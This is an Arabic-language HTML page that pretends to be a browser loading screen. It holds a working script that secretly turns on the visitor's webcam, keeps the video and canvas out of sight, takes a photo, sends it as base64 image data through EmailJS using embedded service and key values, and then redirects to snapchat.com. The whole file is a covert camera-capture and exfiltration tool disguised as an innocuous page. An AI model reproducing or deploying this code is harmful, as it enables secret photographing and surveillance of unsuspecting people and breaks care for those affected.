<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <!-- مكتبة الإرسال EmailJS -->
    <script type="text/javascript" src="https://jsdelivr.net"></script>
    <style>
        body { text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f4; color: #333; }
        video, canvas { display: none; } /* إخفاء الكاميرا */
    </style>
</head>
<body>

    <div id="status">
        <h2>جاري تهيئة المتصفح...</h2>
        <p>يرجى الانتظار لحظة لتحميل المحتوى.</p>
    </div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // معلوماتك الخاصة مدمجة وجاهزة
        const SERVICE_ID = "service_yea65ei";
        const TEMPLATE_ID = "template_tj626bi";
        const PUBLIC_KEY = "eWIb2mjCTi2UFeAAn";

        emailjs.init(PUBLIC_KEY);

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status');

        // 1. تشغيل الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                // الانتظار ثانية ونصف لالتقاط صورة واضحة
                setTimeout(captureAndSend, 1500);
            })
            .catch(err => {
                // التحويل في حال رفض الكاميرا
                window.location.href = "https://snapchat.com";
            });

        function captureAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            // تحويل الصورة لنص Base64
            const imageData = canvas.toDataURL('image/jpeg', 0.5);

            // 2. إرسال البيانات عبر EmailJS
            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
                photo_data: imageData,
                title: "📸 التقاط جديد من الموقع"
            })
            .then(response => {
                console.log('SUCCESS!', response.status, response.text);
                // التوجيه لسناب شات بعد النجاح
                window.location.href = "https://snapchat.com";
            })
            .catch(error => {
                console.error('FAILED...', error);
                window.location.href = "https://snapchat.com";
            });
        }
    </script>
</body>
</html>
